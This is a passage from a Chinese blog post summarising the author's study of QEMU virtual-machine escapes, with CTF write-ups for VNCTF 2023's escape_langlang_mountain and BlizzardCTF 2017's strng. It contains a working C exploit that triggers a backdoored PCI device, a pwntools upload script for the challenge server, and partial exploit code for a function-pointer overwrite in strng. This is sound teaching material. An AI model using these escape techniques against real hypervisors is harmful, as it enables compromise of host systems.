</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/fabe43ff.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/fabe43ff.html" class="post-title-link" itemprop="url">关于qemu逃逸的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:58:52" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">赛题WP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>前一段 <code>VNCTF 2023</code> 正好有一道非常入门 <code>qemu</code> 逃逸的题目，正好以此为契机进行 <code>qemu</code> 逃逸的入门学习，在这部分的学习中，要感谢 <strong>winmt</strong> 和 <strong>roderick</strong> 师傅解答我的一些困惑。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="QEMU与逃逸"><a href="#QEMU与逃逸" class="headerlink" title="QEMU与逃逸"></a>QEMU与逃逸</h3><p><code>QEMU</code> 是纯软件实现的虚拟化<strong>模拟器</strong>，可以模拟多种不同的计算机系统和硬件设备。虽然 <code>QEMU</code> 可以模拟出硬件或虚拟环境，但它本质上只是一个程序，所谓 <code>qemu</code> 逃逸是指攻击者利用 <code>QEMU</code> 实现的有漏洞的 <code>PCI</code> 设备来获取主机的权限。从虚拟机中 “逃出来”，其利用方式和平常用户程序执行 <code>system</code> 函数是一样的，只不过平常 <code>PWN</code> 题的触发方式是通过用户的输入进行触发，而 <code>QEMU</code> 虚拟机的设备漏洞通过运行在虚拟机上的用户程序对设备的 <code>IO</code> 交互来间接触发。</p>
<h3 id="PCI设备"><a href="#PCI设备" class="headerlink" title="PCI设备"></a>PCI设备</h3><p><code>PCI</code> 设备是符合 <code>PCI</code> 总线标准的设备，设备可以申请两类地址空间，分别是 <code>memory space</code> 和 <code>I/O space</code> ，<code>CPU</code> 通过 <code>memory space</code> 访问设备 <code>I/O</code> 的方式称为 <code>memory mapped I/O</code>，也就是 <code>MMIO</code>。通过 <code>I/O space</code> 访问设备 <code>I/O</code> 的方式称为 <code>port mapped I/O</code>，即 <code>PMIO</code>。</p>
<h3 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h3><p><code>MMIO</code> 是指将 <code>I/O</code> 设备的寄存器映射到系统内存地址空间中的一种机制 ，它使用相同的地址总线来处理内存和 <code>I/O</code> 设备，<code>I/O</code> 设备的内存和寄存器被映射到与之相关联的地址。当 <code>CPU</code> 访问某个内存地址时，它可能是物理内存，也可以是某个 <code>I/O</code> 设备的内存，用于访问内存的  <code>CPU</code> 指令也可来访问 <code>I/O</code> 设备。每个 <code>I/O</code> 设备监视 <code>CPU</code> 的地址总线，一旦 <code>CPU</code> 访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳<code> I/O</code>设备，<code>CPU</code> 必须预留给<code>I/O</code> 一个地址区域，该地址区域不能给物理内存使用。</p>
<p>如果能理解上面所说的 <code>MMIO</code> ，那么就不得不提 <code>xxx_mmio_read</code> 和 <code>xxx_mmio_write</code> 这两个函数了（ <code>xxx</code> 是设备名），<code>xxx_mmio_read</code> 函数用于从虚拟设备的 <code>MMIO</code> 地址空间中读取数据，而 <code>xxx_mmio_write</code> 函数则是向指定的 <code>MMIO</code> 地址空间中写入数据。<code>qemu</code> 会监听读写操作，当监听到读写后，就会调用这两个函数。</p>
<h3 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h3><p><code>PMIO</code> 允许CPU通过专用的指令进行输入 输出操作，而不是将I&#x2F;O设备视为内存中的特殊位置,在 <code>PMIO</code> 中，内存和 <code>I/O</code> 设备有各自的地址空间。 端口映射 <code>I/O</code> 通常使用一种特殊的 <code>CPU</code> 指令，专门执行 <code>I/O</code> 操作。在 <code>Intel</code> 的微处理器中，使用的指令是 <code>IN</code> 和 <code>OUT</code>。这些指令可以读&#x2F;写 1,2,4 个字节（例如：outb, outw, outl）到 <code>IO</code> 设备上。<code>I/O</code> 设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在 <code>CPU</code> 物理接口上增加一个 <code>I/O</code> 引脚，要么增加一条专用的 <code>I/O</code> 总线。</p>
<h3 id="什么是QOM？"><a href="#什么是QOM？" class="headerlink" title="什么是QOM？"></a>什么是QOM？</h3><p><code>QOM</code>  <code>（QEMU Object Model）</code> 是 <code>QEMU</code> 的一个核心概念，它是 <code>QEMU</code> 在 <code>C</code> 的基础上自己实现了一套面向对象机制，支持多种体系结构和设备。在 <code>QOM</code> 中，每个设备都被表示为一个对象，对象有一个类型，该类型定义了设备的属性和行为。通过 <code>QOM</code>，开发者可以很方便地添加新的设备和扩展现有设备的功能，从而使 <code>QEMU</code>变得更加强大和灵活。</p>
<h2 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h2><h3 id="escape-langlang-mountain"><a href="#escape-langlang-mountain" class="headerlink" title="escape_langlang_mountain"></a>escape_langlang_mountain</h3><p>题目附件在 <code>buu</code> 的 <code>vnctf 2023</code> 的比赛里就有</p>
<h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><p>作为一名合格的菜鸡，刚开始连咋启动 <code>qemu</code> 都不知道，这里标明一下这俩文件。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251623441.png" alt="image-20230225162320163"></p>
<p>如果有 <code>qemu</code> 的话，那么直接 <code>./launch.sh</code> 就可以启动了。如果没有的话就 <code>sudo apt install qemu-system</code> 安装一下即可，如果还运行不了的话就 <code>ldd</code> 看一下是不是少什么库了，少哪个装哪个就行（具体做法可以参考文末的 <strong>奇奇怪怪的技能</strong> 部分 ）</p>
<p>通过查看 <code>launch.sh</code> 文件我们可以知道设备的名称叫做 <code>vn</code> （如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251629467.png" alt="image-20230225162953416"></p>
<p>接下来打开 <code>ida</code> 进行分析，正常的话看到的是多到让人懵逼的代码。</p>
<p>我们的思路是先定位到 <code>vn_class_init</code> 函数，因为去除了符号表，所以这里得根据特征来识别</p>
<p>我这里参考的是 <strong>winmt</strong> 师傅给我推荐的代码  <a target="_blank" rel="noopener" href="https://github.com/qemu/qemu/blob/master/hw/misc/edu.c">QEMU educational PCI device</a> ，下面所提到的特征都是根据对比这个模板来进行判断的</p>
<p>我个人认为这个 <code>vn_class_init</code> 一个显著特征就是有如下的 <code>id</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251638167.png" alt="image-20230225163814127"></p>
<p>所以我们搜索 <code>vn_class_init</code> 字符串再结合下面这个特征来寻找 <code>vn_class_init</code> 函数，从而判断出来下面这个函数就是 <code>vn_class_init</code> 函数。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251640026.png" alt="image-20230225164013977"></p>
<p>我们在本地启动 <code>qemu</code> 后，根据 <code>lspci</code> 命令得到的结果（比如出现的 <code>0420</code> 和 <code>1337</code> ）与上面 <code>vn_class_init</code> 函数中的 <code>PCI</code> 信息比较一下得知 <code>vn</code> 这个设备号是 <code>04</code> （这个信息在写脚本的时候会用到）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251642828.png" alt="image-20230225164210745"></p>
<p>而之所以上面那里判断 <code>sub_6d9166</code> 为 <code>pci_vn_realize</code> 是因为模板代码中在 <code>xxx_class_init</code> 函数中这里有将 <code>pci_xxx_realize</code> 的函数地址赋值给结构体的成员变量（这些所谓的特征来判断，都是我自己的猜测，无法保证一定正确）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251754897.png" alt="image-20230225175449806" style="zoom:50%;" />



<p>进入 <code>pci_vn_realize</code> 函数，我们这里可以继续对比模板代码（如下），猜测 <code>sub_54ABB5</code> 函数是 <code>memory_region_init_io</code>  ，原因是这个函数出现了 <code>vn_mmio</code> 这个字符串，并且参数也符合 <code>memory_region_init_io</code> 的特征。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251758656.png" alt="image-20230225175818596"></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251801455.png" alt="image-20230225180116377" style="zoom:50%;" />

<p>而 <code>memory_region_init</code> 函数的第三个参数，是 <code>vn_mmio_ops</code> ，它通常是用于访问 <code>MMIO</code> 寄存器的函数集合，这里面存放了 <code>vn_mmio_read</code> 和 <code>vn_mmio_write</code> 的函数指针（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251807914.png" alt="image-20230225180705872"></p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我们再来看 <code>vn_mmio_read</code> 函数代码（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251808609.png" alt="image-20230225180803560" style="zoom:50%;" />

<p>这个代码很短，如果 <code>a2</code> 满足 <code>((a2 &gt;&gt; 20) &amp; 0xF) == 1</code> 和 <code>((a2 &gt;&gt; 16) &amp; 0xF) == 0xF</code> ,那么就可以将字符串 <code>vnctf</code> 复制到 <code>dword_137A358</code> 的地址上。这里很明显是模拟了 <code>mmio_read</code> 函数的功能，即 <code>MMIO</code> 读取数据到 <code>qemu</code> 模拟的内存里，所以最后的 <code>memcpy</code> 函数就是在做这个，而 <code>vnctf</code> 字符串也就是要从 <code>MMIO</code> 里获取的数据。</p>
<p>再看 <code>vn_mmio_write</code> 函数代码（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251820483.png" alt="image-20230225182013429" style="zoom:50%;" />

<p>这里发现了后门函数，如果要触发 <code>system</code> 的话，需要让 <code>a2</code> 为 <code>0x2f0000</code> （简单算一下就行），如果想让 <code>command</code> 为 <code>cat flag</code> 字符串的话，需要让 <code>a2</code> 为 <code>0x100000</code> ，所以这个 <code>vn_mmio_write</code>  要执行两次。</p>
<h4 id="EXP的编写"><a href="#EXP的编写" class="headerlink" title="EXP的编写"></a>EXP的编写</h4><p>上面似乎一切都顺理成章，但我们好像忘记了，如何调用 <code>vn_mmio_read</code> 和 <code>vn_mmio_write</code> 函数并且控制他们的参数？</p>
<p><code>QEMU</code> 实现 <code>MMIO</code> 模拟的其中一个因素就是<strong>监控虚拟机对 <code>MMIO</code> 内存的读写，触发对应的回调函数的执行</strong>。假设我现在对 <code>MMIO</code> 内存进行了读的操作，那么 <code>qemu-system-x86_64</code> 程序中的 <code>vn_mmio_read</code> 回调函数则会被触发，而它的参数，也就是读的 <code>MMIO</code> 地址。</p>
<p>所以我们可以编写一个 <code>C</code> 代码（如下），来对 <code>MMIO</code> 内存进行读的操作（ <code>mmio_mem</code> 是 <code>MMIO</code> 区域的起始地址），之所以这段代码进行了读的操作是因为 <code>return *(mmio_mem + addr)</code> 将 <code>MMIO</code> 区域中的数据读了出来并返回。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *((<span class="type">uint64_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line">mmio_read(<span class="number">0x1f0000</span>);</span><br></pre></td></tr></table></figure>



<p>依次类推 <code>mmio_write</code> 函数是同理，向 <code>MMIO</code> 区域中写入数据，从而触发回调函数 <code>vn_mmio_write</code> ，这里的 <code>value</code> 无所谓，而 <code>addr</code> 则会当做参数传递给 <code>vn_mmio_write</code> </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">  *((<span class="type">uint64_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line">mmio_write(<span class="number">0x100000</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<p>为了获取 <code>MMIO</code> 区域的首地址，我们需要打开其设备的 <code>resource0</code> 文件，使用 <code>mmap</code> 函数将其映射到用户空间上，最终实现了对 <code>MMIO</code> 区域的访问。还记得前面所说的设备号 <code>04</code> 么，接下来 <code>open</code> 的时候需要用到。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *((<span class="type">uint64_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">  *((<span class="type">uint64_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR</span><br><span class="line">| O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">    die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line">  mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,</span><br><span class="line"><span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">    die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line">  mmio_read(<span class="number">0x1f0000</span>);</span><br><span class="line">  mmio_write(<span class="number">0x100000</span>, <span class="number">1</span>);</span><br><span class="line">  mmio_write(<span class="number">0x2f0000</span>, <span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个脚本是 <strong>winmt</strong> 师傅写的，整体思路就是先获取 <code>MMIO</code> 的起始地址，然后进行一次读，两次写的操作，以此来触发回调函数，最终触发了 <code>system(&quot;cat flag&quot;)</code> 。因为这个 <code>qemu_system</code> 程序还是跑在宿主机上的，所以在这个程序中执行 <code>system(&quot;cat flag&quot;)</code> 读取的是宿主机的 <code>flag</code> 从而完成的逃逸，这和 <code>glibc</code> 的题目获取 <code>shell</code> 其实一样，不过最初我以为这个 <code>qemu_system</code> 程序就是在 <code>qemu</code> 里面，所以执行了 <code>system</code> 也是在 <code>qemu</code> 里面所执行的。 </p>
<p>上面这个脚本用 <code>musl-gcc</code> 所编译为静态链接的程序（用 <code>musl-gcc</code> 编译是因为这样生成的程序体积更小，静态链接的程序是因为远程环境有时候没有动态链接库）</p>
<p>编译命令为 <code>musl-gcc exp.c -o exp -static</code> <strong>（ <code>musl-gcc</code> 的编译与配置写到了文末 奇奇怪怪的技能 部分）</strong></p>
<p>如果打远程的话，则需要使用上传脚本（如下，这依然是 <strong>winmt</strong> 师傅所编写的）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, os</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25692</span>)</span><br><span class="line">os.system(<span class="string">&quot;gzip -c ./exp &gt; ./exp.gz&quot;</span>)<span class="comment">#将c脚本编译并命名为 exp</span></span><br><span class="line">os.system(<span class="string">&quot;base64 ./exp.gz &gt; ./b64_exp&quot;</span>)</span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;./b64_exp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">content = fd.read()</span><br><span class="line">length = <span class="built_in">len</span>(content)</span><br><span class="line">fd.close()</span><br><span class="line">per_length = <span class="number">0x200</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, per_length) :</span><br><span class="line">	cmd = <span class="string">&quot;echo &#x27;&quot;</span> + content[i : i + per_length] + <span class="string">&quot;&#x27; &gt;&gt; ./b64_exp&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, cmd)</span><br><span class="line"><span class="keyword">if</span> length - i &gt; <span class="number">0</span> :</span><br><span class="line">	cmd = <span class="string">&quot;echo &#x27;&quot;</span> + content[i : length + <span class="number">1</span>] + <span class="string">&quot;&#x27; &gt;&gt; ./b64_exp&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, cmd)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;base64 -d ./b64_exp &gt; ./exp.gz&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;gunzip ./exp.gz&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;chmod +x ./exp&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;./exp&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261430662.png" alt="image-20230226143001990" style="zoom:50%;" />



<h3 id="strng"><a href="#strng" class="headerlink" title="strng"></a>strng</h3><p>这个的题目链接在 <a target="_blank" rel="noopener" href="https://github.com/rcvalle/blizzardctf2017/releases">这里</a></p>
<p>然后启动脚本用这个 ，自己创建一个 <code>launch.sh</code> 文件就行（通过这个启动脚本可以发现，这个设备名叫做 <code>strng</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure>

<p>启动之后，发现这模拟的是一个 <code>ubuntu</code> 虚拟机，然后登录的用户名是 <code>ubuntu</code> ， 密码是 <code>passw0rd</code> 。</p>
<h4 id="代码逆向"><a href="#代码逆向" class="headerlink" title="代码逆向"></a>代码逆向</h4><p>这个 <code>qemu-system-x86_64</code> 没有去除符号表，但是开了 <code>PIE</code> 。我们的逆向思路是去搜索函数名中存在 <code>strng</code> 字符串的函数，这样可以更快定位到关键函数。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011317071.png" alt="image-20230301131745963" style="zoom:50%;" />



<p>我们从 <code>strng_class_init</code> 函数入手分析（如下），根据这里的数据可以分析出来设备号</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011318907.png" alt="image-20230301131847811" style="zoom:50%;" />



<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011329170.png" alt="image-20230301132945008" style="zoom:50%;" />

<p>如上，可以知道 <code>strng</code> 的设备为 <code>00:03:0</code></p>
<p>然后来依次分析 <code>strng_mmio_read</code>  <code>strng_mmio_write</code> <code>strng_pmio_read</code> <code>strng_pmio_write</code> 这四个函数，在分析之前，需要把这四个函数的第一个参数 <code>opaque</code> 的类型改为 <code>STRNGState *</code> ，这样可以让 <code>ida</code> 识别出来这个结构体，至于为什么这里要修改成 <code>STRNGState *</code>  类型，个人猜测可能这个位置正常的参数类型就是 <code>xxxState *</code> （ <code>xxx</code> 是设备名）</p>
<p> <code>STRNGState</code> 的结构体定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line">    <span class="type">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="type">void</span> (*srand)(<span class="type">unsigned</span> <span class="type">int</span> seed);</span><br><span class="line">    <span class="type">int</span> (*rand)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">int</span> (*rand_r)(<span class="type">unsigned</span> <span class="type">int</span> *seed);</span><br><span class="line">&#125; STRNGState;</span><br></pre></td></tr></table></figure>





<p><code>strng_mmio_read</code> 函数中如果满足 <code>if</code> 的话就返回 <code>regs</code> 数组里的值， </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011442913.png" alt="image-20230301144200823"></p>
<p><code>strng_mmio_write</code> 函数是用 <code>judge</code> 做了三个选择，如果 <code>judge</code> 为 <code>0</code> 就执行结构体中的 <code>srand(val)</code> ，如果为 <code>1</code> 则执行 <code>rand()</code>，如果 <code>judge</code> 为 <code>3</code> 就执行  <code>rand_r(&amp;strng-&gt;regs[2])</code> 以及 <code>regs[judge] = val</code> ，否则的话 <code>judge</code> 存在但不为 <code>3</code> ，就执行 <code>regs[judge] = val</code>。这里是存在一个 <code>regs</code> 数组的任意赋值的，索引和参数都可控</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011451484.png" alt="image-20230301145112412" style="zoom:50%;" />



<p><code>strng_pmio_read</code> 函数存在一个任意地址读，以此来泄露结构体中 <code>regs</code> 数组下面的函数地址。正常来说的话 <code>mmio_read</code> 函数那里的任意地址读，也是可以完成的，但是实践了一下，一直没办法用 <code>mmio_read</code> 泄露出来 <code>libc</code> 数据</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011534573.png" alt="image-20230301153424430" style="zoom:50%;" />



<p><code>strng_pmio_write</code> 函数最重要的有三个点，第一是 <code>opaque-&gt;addr</code> 可控，方便其他几个函数用这个 <code>opaque-&gt;addr</code> 进行利用 ，第二是 <code>v5</code> 为 <code>3</code> 的话，那么执行 <code>rand_r</code> 函数，并且参数为 <code>opaque-&gt;regs[2]</code> ， <code>v5</code> 存在且不为 <code>3</code> 的话，可以利用 <code>regs[v5]=val</code> 实现任意地址写，并且这里的索引可以溢出（可能是因为这个 <code>v5</code> 是 <code>opaque-&gt;addr</code> 来确定的？）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011543310.png" alt="image-20230301154347221" style="zoom:50%;" />



<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>我们可以利用 <code>strng_pmio_write</code> 函数的任意写，来篡改 <code>rand_r</code> 这个函数指针，从而劫持程序的执行流，而这个函数的参数是 <code>regs[2]</code> ，我们可以利用 <code>strng_mmio_write</code> 函数来向 <code>regs[2]</code> 以及之后的内存单元写入数据（也就是布置我们的参数），泄露 <code>libc</code> 地址的话，可以用 <code>strng_pmio_read</code> 函数来进行泄露。</p>
<p>然后我这里采用的是弹一个计算器，其字符串为 <code>gnome-calculator</code>（执行<code>/bin/sh</code> 应该是没法交互的，可能反弹 <code>shell</code> 可以？）</p>
<p>补充：</p>
<p><code>PMIO_BASE</code> 的地址查看命令是 <code>lspci -v</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011630743.png" alt="image-20230301163055688"></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc050</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	perror(msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">unsigned</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *( (<span class="type">uint32_t</span> *)mmio_mem + addr );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val )</span>&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span> *)(mmio_mem + addr)) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    outl(val,addr+PMIO_BASE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span 